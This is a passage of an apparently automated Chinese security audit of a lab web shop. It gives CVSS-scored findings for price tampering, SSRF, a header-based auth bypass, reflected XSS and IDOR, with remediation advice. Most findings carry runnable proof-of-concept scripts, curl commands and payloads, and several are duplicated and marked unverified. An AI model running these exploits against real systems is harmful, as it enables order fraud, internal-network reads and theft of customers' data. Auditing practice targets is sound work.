| C | N | 无读取影响 | lab30-shop/app/public/orders/create.php:7-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 以任意金额创建订单，篡改应付金额 | lab30-shop/app/public/orders/create.php:5-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | L | 同时扣减真实库存 | lab30-shop/app/public/orders/create.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'price_tamper.py', 'language': 'python', 'script': 'import re,urllib.request,urllib.parse,http.cookiejar\nB=\'http://target\'\ncj=http.cookiejar.CookieJar();op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\ntok=re.search(r\'name="csrf" value="([0-9a-f]+)"\',op.open(B+\'/catalog/index.php\').read().decode()).group(1)\ndata=urllib.parse.urlencode({\'csrf\':tok,\'product_id\':\'1\',\'quantity\':\'1\',\'price\':\'0.01\'}).encode()\nprint(op.open(B+\'/orders/create.php\',data).status)', 'instructions': '以已登录用户身份获取 CSRF token 后 POST product_id=1, quantity=1, price=0.01；随后访问 /orders/detail.php 查看 total 为 0.01。', 'normal_input': 'product_id=1&quantity=1&price=<商品真实价格>', 'attack_input': 'product_id=1&quantity=1&price=0.01', 'expected_result': '攻击输入生成的订单 total 为 0.01，而正常输入为真实价格。'}
````

- orders/create.php 以客户端 POST price 作为单价并计算订单总额（价格篡改），服务端未取 products.price（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N，验证：unverified）
  来源 `77c7066cb1d349e58f642e71367be178` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/create.php', 'start_line': 3, 'end_line': 7}, {'path': 'lab30-shop/app/public/catalog/detail.php', 'start_line': 3, 'end_line': 3}]
  结论：create.php 第3行从 $_POST["price"] 经 FILTER_VALIDATE_FLOAT 取得单价，第3行虽查询了 products 行（SELECT * FROM products），第4行只校验 $price<0 与数量范围，第5行 $total=round($price*$quantity,2)，第7行把 $price 与 $total 直接写入 orders.unit_price/total。商品真实单价 $p["price"] 从未参与校验或计算；catalog/detail.php 第3行把价格放在隐藏域 <input type="hidden" name="price" value=...> 中提交，攻击者可用任意非负价格（如 0.01）下单，库存仍按数量扣减，构成服务端信任客户端价格的价格篡改。CSRF 与要求 POST 均不阻止已登录用户改价。
  输入：HTTP POST 参数 price（表单隐藏域，客户端完全可控）
  传播：create.php:3 $_POST["price"] 经 FILTER_VALIDATE_FLOAT -> $price -> :5 $total=$price*$quantity -> :7 INSERT orders(unit_price,total)
  危险操作：以客户端提交单价写入订单 unit_price 与 total，并触发库存扣减
  保护：仅 FILTER_VALIDATE_FLOAT 与 $price<0 校验；无与 $p["price"] 的比较；CSRF token 只防跨站，不防篡改自身请求
  前提：['有效登录会话与同会话 CSRF token（登录表单页面即可获得）；商品存在且库存充足']
  修复建议：服务端以 $p["price"] 作为唯一单价来源，忽略客户端 price 字段；总计由 (float)$p["price"]*$quantity 计算，并可校验与前端展示金额一致。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:53:12.328697+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 下单接口通过 HTTP 访问 | lab30-shop/app/public/orders/create.php:1-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 修改一个已知隐藏字段即可 | lab30-shop/app/public/catalog/detail.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录，但可自助注册 | lab30-shop/app/src/bootstrap.php:33-37 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者对自己的会话下单 | lab30-shop/app/public/orders/create.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一应用内的业务数据完整性受损 | lab30-shop/app/public/orders/create.php:5-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | N | 不涉及数据读取 | lab30-shop/app/public/orders/create.php:7-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | H | 订单金额被任意压低并与库存扣减联动 | lab30-shop/app/public/orders/create.php:5-7 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性破坏 | lab30-shop/app/public/orders/create.php:6-6 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'price_tamper_poc.py', 'language': 'python', 'script': 'import sys, re, urllib.request, http.cookiejar\nbase=sys.argv[1].rstrip("/")\ncj=http.cookiejar.CookieJar(); op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))\nop.open(base+"/auth/register.php", data=b"username=audit%d&password=Passw0rd!123&display_name=a" % __import__("random").randint(1,10**6)).read()\nhtml=op.open(base+"/catalog/detail.php?id=1").read().decode()\ntok=re.search(r\'name="csrf" value="([^"]+)"\', html).group(1)\ndata=urllib.parse.urlencode({"product_id":"1","quantity":"1","price":"0.01","csrf":tok}).encode()\nprint(op.open(base+"/orders/create.php", data=data).read()[:300])\n', 'instructions': 'Python3 运行，参数为靶场基地址。脚本注册账号，取商品页 CSRF token，然后以 price=0.01 提交下单；服务端若返回 303 并生成订单即为成功。', 'normal_input': 'product_id=1&quantity=1&price=<商品真实价格>&csrf=<token>', 'attack_input': 'product_id=1&quantity=1&price=0.01&csrf=<token>', 'expected_result': '对照请求生成正常金额订单；攻击请求同样成功创建订单但 orders.total 为 0.01，库存照常扣减，证明单价取自客户端。'}
````


### 台账 `c75a2af277c24086a450dc46dad72708`

- ops/url-preview.php 以 operator 会话让 file_get_contents 读取任意 URL（SSRF）（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `df60e978c57e42008bbcb453984b681b` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/url-preview.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：url-preview.php 只做 require_user(['operator','admin'])，随后把 $_GET['url'] 原样传给 file_get_contents($url,false,$context,0,65536)，仅设 timeout=4、follow_location=0，未做协议白名单或内网地址过滤，并把响应体 h() 后回显，可读取内网服务响应。
  输入：GET 参数 url
  传播：$_GET['url'] -> file_get_contents 第二参数 -> $output -> h($output) 回显
  危险操作：file_get_contents 读取任意 URL 并回显 64KB 响应体
  保护：仅 follow_location=0 与引号转义，无协议/主机白名单
  前提：['持有 operator 或 admin 角色会话（运营账号本身即可）']
  修复建议：对 url 做协议与主机白名单校验，禁止解析私有/环回地址。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:36:48.857901+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP GET 参数触发 | lab30-shop/app/public/ops/url-preview.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需提交完整 URL | lab30-shop/app/public/ops/url-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user(['operator','admin']) | lab30-shop/app/public/ops/url-preview.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自持会话 | lab30-shop/app/public/ops/url-preview.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 无权限边界改变证据 | lab30-shop/app/public/ops/url-preview.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 回显内网响应体 | lab30-shop/app/public/ops/url-preview.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 仅读取 | lab30-shop/app/public/ops/url-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无破坏证据 | lab30-shop/app/public/ops/url-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'ssrf_url_preview.py', 'language': 'python', 'script': "import sys, urllib.request\nbase=sys.argv[1]; cookie=sys.argv[2]\nreq=urllib.request.Request(base+'/ops/url-preview.php?url=http://127.0.0.1:80/', headers={'Cookie':cookie})\nprint(urllib.request.urlopen(req).read()[:2000].decode('utf-8','replace'))", 'instructions': '以 operator 会话 Cookie 访问 /ops/url-preview.php?url=<内网地址>，对比正常地址。', 'normal_input': 'url=http://fixtures:8080/catalog-info', 'attack_input': 'url=http://127.0.0.1:80/', 'expected_result': '攻击输入在 <pre> 中回显内网服务响应，正常输入回显 fixtures 内容'}
````

- ops/url-preview.php 将 GET url 直接传入 file_get_contents 读取并回显任意 URL/内网资源（SSRF）（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `b41fc933527d4325be74b42c4b978335` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/url-preview.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}]
  结论：url-preview.php 第2行取 $_GET['url'] 并原样用于第3行 file_get_contents($url,...)；仅设置了 timeout 与 follow_location，没有 scheme 白名单、主机名或解析后私网地址过滤，失败时也有分支返回。读取到的前 65536 字节经 h() 输出到 <pre>，攻击者可用 http://169.254.169.254/、内网地址或 file:// 等让服务器代其请求并回显内容。
  输入：GET 参数 url
  传播：$url=(string)($_GET['url']??'') -> stream_context_create -> file_get_contents($url,false,$context,0,65536) -> $output -> h($output) 回显
  危险操作：file_get_contents 以服务器身份请求任意 URL 并回显响应体
  保护：仅 require_user(['operator','admin']) 角色校验；stream context 只设 timeout/follow_location，无目标地址白名单或私网/元数据地址阻断
  前提：['攻击者持有 operator 或 admin 角色会话（页面无 CSRF，GET 请求即可触发）']
  修复建议：对 url 做 scheme 白名单（仅 http/https）、解析后校验 IP 不属于私有/回环/链路本地/元数据段，禁用重定向跟随，使用独立出网代理或域名白名单。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:49:34.502312+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 运营页面可经网络访问 | lab30-shop/app/public/ops/url-preview.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需提供 URL 参数 | lab30-shop/app/public/ops/url-preview.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | require_user 要求 operator/admin 角色会话 | lab30-shop/app/public/ops/url-preview.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b)；lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需其他用户交互 | lab30-shop/app/public/ops/url-preview.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 影响限于服务器发起的请求 | lab30-shop/app/public/ops/url-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 响应体被回显，可读取内网/云元数据内容 | lab30-shop/app/public/ops/url-preview.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 未证明可写操作 | lab30-shop/app/public/ops/url-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 未证明可用性影响 | lab30-shop/app/public/ops/url-preview.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


### 台账 `06dd6b2c44134f1d8578f6e9362d6612`

- ops/maintenance.php 仅凭客户端可伪造的 X-Admin 请求头通过服务身份校验并入队作业（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N，验证：unverified）
  来源 `5771cf5c03854a589e94bc668431508a` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/ops/maintenance.php', 'start_line': 1, 'end_line': 5}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：maintenance.php 用 ($_SERVER['HTTP_X_ADMIN']??'')!=='1' 判定服务身份，该头由客户端完全控制，无密钥、签名或来源校验；通过后 POST 向 jobs 表插入记录并返回 job_id，攻击者无需登录即可通过。
  输入：HTTP 请求头 X-Admin
  传播：$_SERVER['HTTP_X_ADMIN'] -> 校验分支 -> INSERT INTO jobs -> json_response
  危险操作：以伪造服务身份向 jobs 表写入作业并回显
  保护：仅比较固定字符串 '1'，无服务令牌/签名校验
  前提：['可直接访问 /ops/maintenance.php，无需登录']
  修复建议：改用服务端共享密钥/签名或双向 TLS 校验内部服务身份，不依赖客户端请求头。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:36:48.858839+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 请求远程触发 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 仅需添加一个请求头 | lab30-shop/app/public/ops/maintenance.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 无 require_user 调用 | lab30-shop/app/public/ops/maintenance.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者自行发起 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一应用内越权接口 | lab30-shop/app/public/ops/maintenance.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 回显 job_id 等作业信息 | lab30-shop/app/public/ops/maintenance.php:4-5 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可向 jobs 表写入记录 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无中断服务证据 | lab30-shop/app/public/ops/maintenance.php:4-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'auth_bypass_maintenance.sh', 'language': 'bash', 'script': "curl -i -X POST -H 'X-Admin: 1' http://TARGET/ops/maintenance.php", 'instructions': '替换 TARGET 为目标地址。', 'normal_input': 'curl -i http://TARGET/ops/maintenance.php', 'attack_input': "curl -i -X POST -H 'X-Admin: 1' http://TARGET/ops/maintenance.php", 'expected_result': '正常请求 403；攻击请求返回 accepted=true 与 job_id'}
````


### 台账 `3d7bcd8666c149e884a6533f109c96f2`

- catalog/greeting.php 未转义回显 $_GET['name'] 导致反射型 XSS（CVSS 3.1 Base 5.4 (medium) · CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N，验证：unverified）
  来源 `620b5c8de5f94d3c91e3184cc8e2b09e` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/catalog/greeting.php', 'start_line': 2, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 10, 'end_line': 10}]
  结论：行2 把 $_GET['name'] 强转字符串存入 $name；行3 在 page() 回调中 echo '<h2>你好，'.$name.'</h2>'，未调用 bootstrap.php:10 提供的 h()，攻击者可注入脚本在受害者浏览器执行。
  输入：GET 参数 name
  传播：$_GET['name'] -> (string) -> $name -> echo 拼接进 <h2>
  危险操作：echo 未转义输出到 text/html
  保护：h() 存在但该行未调用，无过滤
  前提：['诱导受害者访问 /catalog/greeting.php?name=...；页面无需登录']
  修复建议：行3 改为 echo '<h2>你好，'.h($name).'</h2>'。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:37:17.330827+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 远程 HTTP | lab30-shop/app/public/catalog/greeting.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 构造 URL 即可 | lab30-shop/app/public/catalog/greeting.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | N | 无需登录 | lab30-shop/app/public/catalog/greeting.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | R | 需受害者点击 | lab30-shop/app/public/catalog/greeting.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同源上下文 | lab30-shop/app/public/catalog/greeting.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | L | 可读取受害者会话页面数据 | lab30-shop/app/public/catalog/greeting.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | L | 可在受害者上下文操作 | lab30-shop/app/public/catalog/greeting.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/catalog/greeting.php:3-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'xss_r_greeting.txt', 'language': 'text', 'script': 'GET /catalog/greeting.php?name=<script>alert(document.domain)</script> HTTP/1.1\nHost: target', 'instructions': '访问 /catalog/greeting.php?name=... 观察 <h2> 是否原样输出脚本标签', 'normal_input': 'name=Alice', 'attack_input': 'name=<script>alert(document.domain)</script>', 'expected_result': '正常显示“你好，Alice”；攻击输入在响应中出现未转义 <script> 并被执行'}
````


### 台账 `4e35ce72f856430faf590095346c382a`

- orders/detail.php 以 $_GET['id'] 查询订单但未校验归属，任意登录用户可读取他人订单（IDOR）（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `e4200d2b001a48fbb73370666236662f` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/detail.php', 'start_line': 2, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：行2 require_user() 仅校验登录，SQL 仅以 o.id=? 过滤、未约束 o.user_id；行3 在 JSON 请求时 json_response($o) 返回整行，行4 回显 order_no、username、total、private_note。bootstrap.php:33-37 的 require_user 无资源级授权。
  输入：GET 参数 id
  传播：$_GET['id'] -> execute -> $o -> json_response / h() 回显私有字段
  危险操作：按可控订单 ID 返回他人订单数据
  保护：预处理防注入，但缺少归属校验
  前提：['任意有效登录会话（注册即可）']
  修复建议：SQL 增加 AND o.user_id=? 并绑定当前用户；或取回后校验归属否则 404。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:37:17.331756+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 远程 HTTP | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 遍历 id | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需普通登录用户 | lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需他人参与 | lab30-shop/app/public/orders/detail.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同体系越权读取 | lab30-shop/app/public/orders/detail.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 读取他人订单及私有配送备注 | lab30-shop/app/public/orders/detail.php:3-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读 | lab30-shop/app/public/orders/detail.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'idor_order_detail.txt', 'language': 'text', 'script': 'GET /orders/detail.php?id=1 HTTP/1.1\nHost: target\nCookie: SHOPSESSID=<attacker session>\nAccept: application/json', 'instructions': '普通账号登录后遍历 id 访问 /orders/detail.php', 'normal_input': 'id=<自己订单ID>', 'attack_input': 'id=1（他人订单）', 'expected_result': '攻击输入返回他人订单 order_no/username/total/private_note'}
````

- orders/detail.php 以可控 $_GET['id'] 查询订单未校验 user_id 归属，任意登录用户可读取他人订单（含 private_note）（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `bf420c67c7144f3e824ea02658d49528` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/detail.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/public/orders/index.php', 'start_line': 1, 'end_line': 3}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 20, 'end_line': 25}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 37}]
  结论：detail.php 第2行仅 require_user() 取得登录态，随后用 SELECT o.*,u.username,p.name ... WHERE o.id=? 执行 $_GET['id']，SQL 与后续分支均未比对 o.user_id 与当前会话用户 $u['id']（该文件甚至未保存 require_user() 返回值）。第3行对 Accept: application/json 直接 json_response($o)，第4行渲染 private_note、购买人用户名与金额。对照 orders/index.php 第2行按 user_id=? 过滤，可见 detail.php 缺少同样的归属约束，任何登录用户遍历 id 即可读取他人订单数据。
  输入：HTTP GET 参数 id（URL /orders/detail.php?id=N）
  传播：$_GET['id'] -> prepare('... WHERE o.id=?')->execute([$_GET['id']]) -> fetch() -> json_response($o) / HTML 输出 private_note,username,total
  危险操作：按攻击者控制的订单 ID 查询并返回任意订单记录（含私密备注、购买人、金额）
  保护：仅有登录校验（require_user）与参数化查询；无 owner 校验、无角色区分，参数化只防注入不防越权
  前提：['任意有效登录会话（注册即可获得）；目标订单 id 存在']
  修复建议：查询加入归属约束：WHERE o.id=? AND o.user_id=?，绑定 $u['id']；或查询后显式比较 $o['user_id'] !== $u['id'] 时返回 403/404。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:49:11.194313+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | 通过 HTTP 请求远程访问 | lab30-shop/app/public/orders/detail.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 直接构造 id 参数即可，无额外条件 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需登录，注册即可获得普通用户会话 | lab30-shop/app/src/bootstrap.php:33-35 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 攻击者单方请求即可 | lab30-shop/app/public/orders/detail.php:2-3 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 同一应用内读取他人数据，未跨越安全边界 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 返回订单全字段含 private_note、购买人用户名、金额 | lab30-shop/app/public/orders/detail.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 仅读操作 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
{'filename': 'idor_order_detail.sh', 'language': 'bash', 'script': "# 以普通用户 A 登录拿到 cookie，然后遍历订单 id\ncurl -s -b 'SHOPSESSID=<A_session>' -H 'Accept: application/json' 'http://target/orders/detail.php?id=1'\ncurl -s -b 'SHOPSESSID=<A_session>' -H 'Accept: application/json' 'http://target/orders/detail.php?id=2'", 'instructions': '注册/登录任意普通账号取得 SHOPSESSID cookie，替换脚本中的占位，将 target 指向部署地址，逐个递增 id 请求；也可以浏览器直接访问 /orders/detail.php?id=N。', 'normal_input': '/orders/detail.php?id=<自己的订单id>', 'attack_input': '/orders/detail.php?id=<他人订单id>', 'expected_result': '他人订单返回 200 并输出 order_no、username、total、private_note；非存在 id 返回 404 提示订单不存在，可用于枚举。'}
````

- orders/detail.php 按可控订单 id 查询且未校验 user_id 归属，任意登录用户可读取他人订单（含私密备注）（CVSS 3.1 Base 6.5 (medium) · CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N，验证：unverified）
  来源 `28f230be064b4a01836eba53d3b46c40` / 修订 1
  证据：[{'path': 'lab30-shop/app/public/orders/detail.php', 'start_line': 1, 'end_line': 4}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 33, 'end_line': 36}, {'path': 'lab30-shop/app/src/bootstrap.php', 'start_line': 20, 'end_line': 25}]
  结论：detail.php 第2行以 $_GET['id'] 绑定查询订单，仅判断记录是否存在，未比较 o.user_id 与当前登录用户；第3行在 Accept 含 application/json 时直接 json_response($o)，第4行渲染购买人、金额、private_note。攻击者迭代 id 即可越权读取他人订单。
  输入：GET 参数 id（$_GET['id']??0），Accept 头控制输出格式
  传播：$_GET['id'] -> WHERE o.id=? -> $o -> json_response($o) 或 page() 渲染
  危险操作：按攻击者控制的主键返回任意订单记录（含 private_note 与购买人）
  保护：require_user() 仅保证已登录；无 user_id 归属校验、无所有权过滤
  前提：['任意有效登录会话（注册即可）；目标订单 id 存在']
  修复建议：查询中加入 AND o.user_id=? 并绑定当前用户 id，或取回后比较 $o['user_id']===$u['id'] 再输出。

**CVSS 3.1 评分依据**

- 状态：已量化；来源：自动指标，宿主计算
- 评分版本：1；适用结论版本：1；引擎：cvss31-base-1
- 来源任务：db35a73a71c34f5f9ebd6462a6f0856e
- 来源 ZIP 快照：586b79b41f8e4f59be80f2a9b548902b
- 评分时间：2026-10-28T10:51:14.964201+00:00

| 指标 | 取值 | 判断依据 | 源码引用或人工假设 | 待补充事项 |
|---|---|---|---|---|
| AV | N | HTTP 接口可远程访问 | lab30-shop/app/public/orders/detail.php:1-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| AC | L | 只需替换 id 并携带自身会话 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| PR | L | 需任意已登录账号，注册即可获得 | lab30-shop/app/src/bootstrap.php:33-36 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| UI | N | 无需其他用户参与 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| S | U | 仍在同一应用授权范围内 | lab30-shop/app/public/orders/detail.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| C | H | 返回他人订单号、购买人、金额与 private_note | lab30-shop/app/public/orders/detail.php:2-4 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| I | N | 只读查询，无写入 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |
| A | N | 无可用性影响 | lab30-shop/app/public/orders/detail.php:2-2 (ZIP 586b79b41f8e4f59be80f2a9b548902b) | — |

评分、引用校验、自动验证和结论处置分别记录。


可复核 POC（是否执行以验证记录为准）：

````text
